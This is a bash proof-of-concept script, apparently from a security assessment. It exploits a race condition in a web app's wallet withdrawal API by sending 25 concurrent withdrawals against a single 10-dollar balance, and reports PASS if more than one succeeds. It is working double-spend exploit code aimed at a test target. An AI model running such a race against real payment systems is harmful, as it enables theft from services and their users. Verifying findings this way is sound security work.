#!/usr/bin/env bash
# a10-f01: TOCTOU race in wallet withdraw.
# With the CLIENT wallet already inflated by the a10-f06 specialist's test
# (balance ~9.2e18 cents), we use a fresh user to make the race visible.
# If that user has no remaining balance, we register a new client via the API.

set -uo pipefail
set -a; source /tmp/tokens.env; set +a
TARGET="${TARGET_URL:-http://localhost:3000}"

wallet_balance() {
  local tok="$1"
  curl -s -H "Authorization: Bearer $tok" "$TARGET/api/payments/wallet" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(int(d.get('balance') or d.get('wallet',{}).get('balance') or 0))"
}

echo "=== a10-f01: wallet withdraw race (fresh user) ==="
EMAIL="race_$(date +%s%N)@test.com"
PASS="TestPass123!"

echo "--- Step 1: register a fresh client ---"
RES=$(curl -s -X POST "$TARGET/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"username\":\"race_$(date +%s)\",\"password\":\"$PASS\",\"display_name\":\"R\",\"role\":\"client\"}")
TOK=$(echo "$RES" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")
if [[ -z "$TOK" ]]; then
  echo "  register failed: $RES"; exit 1
fi
echo "  registered $EMAIL"

echo "--- Step 2: deposit exactly 1000 cents ---"
curl -s -X POST "$TARGET/api/payments/wallet/deposit" \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"amount":10}' > /dev/null
BEFORE=$(wallet_balance "$TOK")
echo "  balance: $BEFORE cents"

echo "--- Step 3: 25 concurrent withdrawals of 1000 cents ---"
TMP=$(mktemp -d)
for i in $(seq 1 25); do
  (curl -s -o "$TMP/wd_$i.json" -X POST \
    -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"amount":10}' \
    "$TARGET/api/payments/wallet/withdraw" &)
done
wait

SUCC=$(grep -l 'withdrawal' "$TMP"/wd_*.json 2>/dev/null | wc -l | tr -d ' ')
AFTER=$(wallet_balance "$TOK")
echo "  successful withdrawals: $SUCC / 25"
echo "  final balance: $AFTER cents"

echo
echo "=== VERDICT ==="
if (( SUCC > 1 )); then
  echo "PASS: race produced $SUCC successful withdrawals against a single \$10 balance (final=$AFTER)."
  exit 0
elif (( AFTER < 0 )); then
  echo "PASS: final balance went negative ($AFTER cents) — race observable."
  exit 0
else
  echo "FAIL: only $SUCC winner(s), balance=$AFTER"
  exit 1
fi
